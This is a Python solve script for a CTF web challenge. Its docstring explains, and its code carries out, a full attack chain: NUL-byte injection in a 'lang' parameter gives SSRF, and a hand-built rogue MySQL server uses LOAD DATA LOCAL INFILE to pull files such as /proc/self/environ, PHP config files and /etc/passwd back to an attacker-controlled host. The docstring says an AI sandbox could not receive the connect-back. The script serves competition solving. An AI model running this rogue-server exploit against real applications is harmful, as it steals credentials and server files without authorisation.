#!/usr/bin/env python3
"""Medofans (Avito CTF 2026) -- SSRF -> rogue-MySQL -> LOAD DATA LOCAL INFILE.

How the solution was reached (same logic as the write-up, condensed):

  * ``/api/content.php?lang=<L>`` builds a DB host ``<L>.db.internal`` and a
    schema ``hbf_<L>``, then ``mysqli_connect``s. The flag lives only in the
    German locale as a fact whose body is server-side redacted to
    ``/*REDACTED*/``, so it can never be read through the normal response.
  * The prior analysis declared the host uncontrollable because every attempt
    kept the ``.db.internal`` suffix in the error message. That reading was
    wrong: PHP builds ``"<lang>.db.internal"`` as a binary-safe string, but the
    C ``getaddrinfo`` under it stops at the FIRST NUL byte. So
    ``lang=<HOST>%00`` makes the app actually resolve+connect to ``<HOST>``
    while the JSON error still cosmetically prints ``<HOST>\\x00.db.internal``.
    Proof: ``127.0.0.1%00`` -> "Connection refused" (real dial to :3306),
    ``8.8.8.8%00`` -> "Connection timed out" -- NOT "getaddrinfo failed".
  * That is a full SSRF to any ``host:3306`` (the port is fixed at 3306 -- a
    ``:port`` suffix is split off and dropped). We stand up a rogue MySQL
    server: complete the handshake, then answer the app's first ``COM_QUERY``
    with a ``LOCAL INFILE`` request (0xFB + path). A mysqli client with
    ``local_infile`` enabled uploads that local file to us -- bypassing the
    ``/*REDACTED*/`` app-layer redaction, since the bytes arrive on our socket
    rather than through the app's (redacted) HTTP output.

DELIVERY REQUIREMENT (read this):
  The app dials OUT to ``<CONNECT_BACK>:3306``. ``CONNECT_BACK`` must therefore
  be a host/IP that is *publicly reachable by the challenge server on TCP/3306*
  and on which this script's rogue server is listening. A NAT'd laptop or a
  Claude sandbox cannot receive that inbound connection (verified: the sandbox
  egress IP actively refuses inbound :3306). Run this from a VPS with a public
  IP and 3306 open, passing ``--connect-back <public-ip>``.

Dependencies: stdlib + ``requests`` (both ty-checkable). The MySQL wire framing
is hand-rolled -- no driver needed.

Usage:
    python3 solve_medofans.py \\
        --target https://hbfuns-9vqogw6q.avitoctf.ru \\
        --connect-back <YOUR_PUBLIC_IP>
"""

from __future__ import annotations

import argparse
import re
import socket
import struct
import threading
from dataclasses import dataclass, field

import requests

# Files worth reading, most-likely-first. content.php reveals where the flag
# comes from (DB row vs file vs env) and the DB creds; environ often carries a
# FLAG/secret; the rest are common flag drop locations.
DEFAULT_FILES: tuple[str, ...] = (
    "/proc/self/environ",
    "/var/www/html/api/content.php",
    "/var/www/html/content.php",
    "/var/www/html/api/config.php",
    "/var/www/html/config.php",
    "/flag",
    "/flag.txt",
    "/app/flag.txt",
    "/etc/passwd",
)

# Greeting capability flags. CLIENT_LOCAL_FILES must be advertised so the client
# will honour our LOCAL INFILE request; the client still needs its own
# local_infile enabled to actually stream the file.
_CAP_LOW = 0xF7FF
_CAP_HIGH = 0xF781

_OK = b"\x00\x00\x00\x02\x00\x00\x00"  # OK: affected=0, insert_id=0, status=2, warn=0
_FLAG_RE = re.compile(rb"avito\{[^}]*\}")


@dataclass
class Capture:
    """Shared state: the path currently being requested and the bytes read."""

    target_path: str = "/etc/passwd"
    data: bytes = b""
    got_file: bool = False
    event: threading.Event = field(default_factory=threading.Event)


def _packet(payload: bytes, seq: int) -> bytes:
    """Frame a MySQL payload with its 3-byte length + 1-byte sequence header."""
    return struct.pack("<I", len(payload))[:3] + bytes([seq & 0xFF]) + payload


def _recv_exact(sock: socket.socket, n: int) -> bytes:
    """Receive exactly ``n`` bytes (or fewer if the peer closes early)."""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf


def _read_packet(sock: socket.socket) -> tuple[bytes, int]:
    """Read one full MySQL packet; return (payload, sequence_id)."""
    header = _recv_exact(sock, 4)
    if len(header) < 4:
        return b"", -1
    length = header[0] | (header[1] << 8) | (header[2] << 16)
    return _recv_exact(sock, length), header[3]


def _greeting() -> bytes:
    """Build a protocol-10 server greeting advertising CLIENT_LOCAL_FILES."""
    salt1 = b"\x11\x22\x33\x44\x55\x66\x77\x88"
    salt2 = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    payload = b"".join(
        (
            b"\x0a5.7.40-rogue\x00",  # protocol 10 + version, null-terminated
            struct.pack("<I", 0x36),  # thread id
            salt1,
            b"\x00",  # filler
            struct.pack("<H", _CAP_LOW),
            b"\x21",  # charset utf8_general_ci
            struct.pack("<H", 0x0002),  # status flags
            struct.pack("<H", _CAP_HIGH),
            b"\x15",  # auth-plugin-data length = 21
            b"\x00" * 10,  # reserved
            salt2,
            b"\x00",
            b"mysql_native_password\x00",
        )
    )
    return _packet(payload, 0)


def _handle_connection(conn: socket.socket, cap: Capture) -> None:
    """Drive one client through handshake and a LOCAL INFILE file read."""
    try:
        conn.settimeout(10)
        conn.sendall(_greeting())
        _read_packet(conn)  # client login/auth -- ignored, we accept everyone
        conn.sendall(_packet(_OK, 2))

        # The app now issues its content query. Answer the first COM_QUERY with a
        # LOCAL INFILE request for our target file.
        payload, _ = _read_packet(conn)
        if not payload or payload[0] != 0x03:  # 0x03 = COM_QUERY
            return
        conn.sendall(_packet(b"\xfb" + cap.target_path.encode(), 1))

        # Client streams the file back in packets, ending with an empty packet.
        blob = b""
        while True:
            data, seq = _read_packet(conn)
            if seq == -1 or data == b"":
                break
            blob += data
        cap.data = blob
        cap.got_file = bool(blob)
        conn.sendall(_packet(_OK, 3))  # finish the statement cleanly
    except OSError:
        pass
    finally:
        cap.event.set()
        try:
            conn.close()
        except OSError:
            pass


def _serve(listener: socket.socket, cap: Capture, stop: threading.Event) -> None:
    """Accept loop: each inbound connection serves the current target path."""
    while not stop.is_set():
        try:
            conn, _addr = listener.accept()
        except OSError:
            break
        _handle_connection(conn, cap)


def trigger(target: str, connect_back: str, timeout: float = 15.0) -> str:
    """Fire the null-byte SSRF so the app dials our rogue server.

    Args:
        target: Base URL of the challenge (trailing slash optional).
        connect_back: Host/IP the app should connect to (our rogue server).
        timeout: Per-request timeout in seconds.

    Returns:
        The raw response body from the app (useful for debugging).
    """
    url = f"{target.rstrip('/')}/api/content.php"
    # lang = "<host>\x00" -> host resolves via truncated getaddrinfo, port 3306.
    try:
        resp = requests.get(url, params={"lang": f"{connect_back}\x00"}, timeout=timeout)
        return resp.text
    except requests.RequestException as exc:
        return f"<request error: {exc}>"


def exfiltrate(
    target: str, connect_back: str, files: tuple[str, ...], bind_port: int = 3306
) -> dict[str, bytes]:
    """Read each candidate file off the web server via LOAD DATA LOCAL INFILE.

    Args:
        target: Challenge base URL.
        connect_back: Public host/IP the app connects back to (our server).
        files: Absolute paths to attempt, in priority order.
        bind_port: Local port to listen on (must be 3306 to match the app).

    Returns:
        Mapping of file path -> bytes read (empty if nothing came back).
    """
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("0.0.0.0", bind_port))
    listener.listen(8)
    listener.settimeout(1.0)

    cap = Capture()
    stop = threading.Event()
    server = threading.Thread(target=_serve, args=(listener, cap, stop), daemon=True)
    server.start()

    results: dict[str, bytes] = {}
    try:
        for path in files:
            cap.target_path = path
            cap.data = b""
            cap.got_file = False
            cap.event.clear()
            print(f"[*] reading {path} ...", flush=True)
            trigger(target, connect_back)
            cap.event.wait(timeout=12)
            results[path] = cap.data
            if cap.got_file:
                preview = cap.data[:400].decode("utf-8", "replace")
                print(f"[+] {len(cap.data)} bytes:\n{preview}\n", flush=True)
                match = _FLAG_RE.search(cap.data)
                if match:
                    print(f"[!!] FLAG: {match.group().decode()}", flush=True)
                    break
            else:
                print("[-] nothing returned (local_infile off, or path missing)", flush=True)
    finally:
        stop.set()
        listener.close()
    return results


def main() -> None:
    """Parse args and run the exfiltration loop."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="https://hbfuns-9vqogw6q.avitoctf.ru")
    parser.add_argument(
        "--connect-back",
        required=True,
        help="Public host/IP the challenge server can reach on TCP/3306 (this server).",
    )
    parser.add_argument("--port", type=int, default=3306, help="Local listen port (keep 3306).")
    parser.add_argument(
        "--file",
        action="append",
        dest="files",
        help="Override target file(s); repeatable. Defaults to a built-in list.",
    )
    args = parser.parse_args()

    files = tuple(args.files) if args.files else DEFAULT_FILES
    results = exfiltrate(args.target, args.connect_back, files, bind_port=args.port)

    for path, blob in results.items():
        match = _FLAG_RE.search(blob)
        if match:
            print(f"\n=== FLAG in {path}: {match.group().decode()} ===")
            return
    print("\n[!] No avito{...} found in read files; inspect content.php output above.")


if __name__ == "__main__":
    main()
